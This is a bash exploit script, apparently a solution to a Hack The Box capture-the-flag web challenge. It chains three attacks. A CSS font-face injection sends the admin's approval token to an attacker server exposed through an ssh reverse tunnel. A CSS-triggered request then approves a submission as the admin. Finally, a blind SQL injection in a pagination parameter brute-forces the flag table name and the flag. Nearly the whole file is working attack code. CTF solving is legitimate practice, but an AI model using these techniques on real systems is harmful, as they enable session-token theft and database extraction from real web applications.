#!/bin/bash

# To note that the CSP of the page is the following
# Content-Security-Policy: default-src 'self'; object-src 'none'; img-src 'self'; style-src 'self'; font-src 'self' *;
# So we need to use inject onto CSS font styles since "font-src 'self' *;"
#
# We need to leak the approvalToken and we know it's generated like this:
# ```
#     const dict = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
#     const shuffle = v=>[...v].sort(_=>Math.random()-.5).join('');
#     // Shuffle characters and sort them in ASCII order
#     return shuffle(dict).substring(0, 32).split('').sort().join('');
# ```
# So the token will be ordered. If we leak all the characters contained in the token we can guess the token.
# We can do that using this trick:
#   https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection#text-node-exfiltration-i-ligatures

TARGET='localhost:1337'
TARGET='94.237.63.132:33714'

TMP_LOG=$(mktemp)
HTTP_LOG=$(mktemp)
# kill all background jobs when script exits
trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT
echo + exposing port 9999 to the internet
http-server.py 9999 > $HTTP_LOG & # https://github.com/orrors/cheat-sheets/blob/main/samples/http-server.py
ssh -R 80:localhost:9999 localhost.run -- --no-inject-http-proxy-headers >$TMP_LOG 2>&1 &
while ! PUBLIC_URL=$(grep 'https://.*life' -o $TMP_LOG) ; do sleep 0.1; done
echo + using $PUBLIC_URL

# generate all the font faces that will extract each character
gen_css_fonts_exfill() {
	for i in {48..57} {65..90} {97..122}; do
		letter=$(printf "\\$(printf '%03o' "$i")")
		echo -n "@font-face{font-family:poc;src:url(${PUBLIC_URL}/?$letter);unicode-range:U+$(printf '%04X' "$i");}"
	done
}

css="$(gen_css_fonts_exfill) #approvalToken{display:block !important;font-family: poc}"
payload=$(jq -cn --arg css "$css" '{customCSS:$css}') # use jq to encode the payload in json

# this will cause the admin browser to request all the fake fonts to our host
submissionId=$(curl -s --json "${payload}" "http://${TARGET}/api/submission/submit" | grep -oP '(?<=Number )[0-9]+')

# extract all the characters requested and order them, resulting in the approvalToken
while approvalToken=$(grep -oP '(?<=\?)[A-Za-z0-9]' $HTTP_LOG | LC_ALL=C sort | paste -sd'\0') ; do
	[[ ${#approvalToken} -eq 32 ]] && break
	sleep 0.5;
done

echo + found approval token: $approvalToken

# do a simple xss to approve the previous submission
payload=$(jq -cn --arg css ".card-body{background-image:url(/approve/${submissionId}/${approvalToken})}" '{customCSS:$css}') # use jq to encode the payload in json
curl -s --json "${payload}" "http://${TARGET}/api/submission/submit" > /dev/null
sleep 2 # wait for css injection so that submission is approved
echo + approved submission number ${submissionId}

# now we can create a comment on the post that will help us extract information from the database
echo -n " ++ "
curl -s --json "$(jq -cn --arg id "${submissionId}" '{submissionID:$id,commentContent:"pwned"}')" "http://${TARGET}/api/comment/submit" | jq -r '.message'

# with the comment we can perform an sql injection on the LIMIT of the query to get the name of the flag table
# the only way I could think off is to use a subquery to determine the limit (either 1 or 0)
flag_table="flag_"
charset='abcdef0123456789'
echo + bruteforcing flag table name:
while [ ${#flag_table} != 13 ]; do
	for char in $(echo $charset | fold -w1); do
		limit_injection="(SELECT count(*) FROM sqlite_master WHERE type='table' AND name LIKE '${flag_table}${char}%')"
		if curl -s --json "$(jq -cn --arg id "${submissionId}" --arg limit "${limit_injection}" '{submissionID:$id,pagination:$limit}')" "http://${TARGET}/api/comment/entries" | grep -q pwned ; then
			flag_table+="$char"
			echo $flag_table
			break
		fi
	done
done
echo + got flag table name: $flag_table

# do the same thing to get the actual flag:
flag="HTB{"
charset='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$&()*+,-./:;<=>?@[\]^{|}~_'
echo + bruteforcing the flag:
while [[ "${flag: -1}" != '}' ]]; do
	for char in $(echo $charset | fold -w1); do
		limit_injection="(SELECT count(*) FROM ${flag_table} WHERE flag LIKE '${flag}${char}%')"
		if curl -s --json "$(jq -cn --arg id "${submissionId}" --arg limit "${limit_injection}" '{submissionID:$id,pagination:$limit}')" "http://${TARGET}/api/comment/entries" | grep -q pwned ; then
			flag+="$char"
			echo ++ $flag
			break
		fi
	done
done




